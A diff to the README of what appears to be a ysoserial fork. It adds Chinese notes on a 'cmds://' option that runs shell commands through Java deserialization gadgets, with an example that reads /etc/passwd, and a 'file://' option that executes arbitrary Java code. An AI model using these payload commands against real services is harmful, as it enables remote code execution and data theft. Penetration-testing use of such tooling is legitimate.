@@ -78,6 +78,16 @@ Usage: java -jar ysoserial.jar [payload] '[command]'
      Wicket1             @jacob-baines               wicket-util:6.23.0, slf4j-api:1.6.4
 ```
 
+修改 `ysoserial.payloads.util.Gadgets` 增强了一些功能  
+`cmds://` 用 exec(new String[]{}) 来调用命令, 原版的 ysoserial 是不能 bash -c "" 这样执行命令的 
+```sh
+java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 'cmds://["bash","-c","kate /etc/passwd"]' > target/1.bin
+```
+`file://` 将会读取文件, 执行里面的 java 代码
+```sh
+java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 file://1.java > target/1.bin
+```
+
 ## Examples
 
 ```shell
